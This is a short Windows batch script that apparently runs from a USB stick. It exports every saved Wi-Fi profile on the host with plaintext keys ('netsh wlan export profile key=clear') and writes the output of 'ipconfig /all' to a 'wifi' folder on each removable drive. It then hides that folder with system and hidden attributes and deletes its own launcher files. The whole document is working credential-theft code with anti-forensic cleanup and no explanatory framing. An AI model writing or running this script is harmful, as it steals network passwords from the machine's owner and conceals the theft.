@echo off
for /F "tokens=1*" %%a in ('fsutil fsinfo drives') do (
   for %%c in (%%b) do (
      for /F "tokens=3" %%d in ('fsutil fsinfo drivetype %%c') do (
         if %%d equ Removable (
            IF NOT EXIST %%cwifi\ mkdir %%cwifi
            netsh wlan export profile folder=%%cwifi key=clear
            ipconfig /all > %%cwifi\ip.txt  
            attrib +s +r +h %%cwifi
            del "%%cWiPS.bat" /f 
            del "%%cWiPS.lnk" /f
         )
      )
   )
)
